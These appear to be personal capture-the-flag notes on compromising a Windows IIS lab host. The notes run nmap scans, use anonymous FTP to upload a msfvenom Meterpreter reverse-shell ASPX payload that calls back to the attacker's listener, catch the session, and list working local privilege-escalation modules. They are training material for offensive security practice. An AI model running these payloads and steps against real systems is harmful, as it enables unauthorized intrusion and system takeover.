
# Nmap

```bash
> nmap -Pn -p- --min-rate 4000 10.10.10.5
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-03 10:36 +0700
Nmap scan report for 10.10.10.5
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

```bash
> nmap -Pn -p21,80 -sCV 10.10.10.5
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-03 10:37 +0700
Nmap scan report for 10.10.10.5
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# nmap vuln and safe scripts

```bash
nmap --script "vuln and safe" 10.10.10.5 -p21,80
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-30 07:54 +0700
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.59% done; ETC: 07:54 (0:00:01 remaining)
Nmap scan report for 10.10.10.5
Host is up (0.17s latency).

PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
| http-vuln-cve2015-1635:
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|
|     Disclosure date: 2015-04-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
|_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx

Nmap done: 1 IP address (1 host up) scanned in 132.01 seconds
```
# Uploads aspx Meterpeter Payloads

```bash
> msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f aspx > rev-shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 177734 bytes
Final size of aspx file: 898666 bytes
```

```bash
> ftp 10.10.10.5 -p
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:akhmadm): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put rev-shell.aspx
227 Entering Passive Mode (10,10,10,5,192,32).
```

# Start Meterpreter Listener
#meterpreter 
```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.10.14.2
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.5:49194) at 2025-09-03 11:14:40 +0700

meterpreter > [*] Meterpreter session 2 opened (10.10.14.2:4444 -> 10.10.10.5:49193) at 2025-09-03 11:14:43 +0700

meterpreter > getuid
Server username: IIS APPPOOL\Web
```

# Scan Reconnaissance Module for PrivEsc
#metasploit 
```bash
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
```

```
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 17  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
```

# Known working post privesc

1. exploit/windows/local/ms10_015_kitrap0d
2. exploit/windows/local/ms13_053_schlamperei

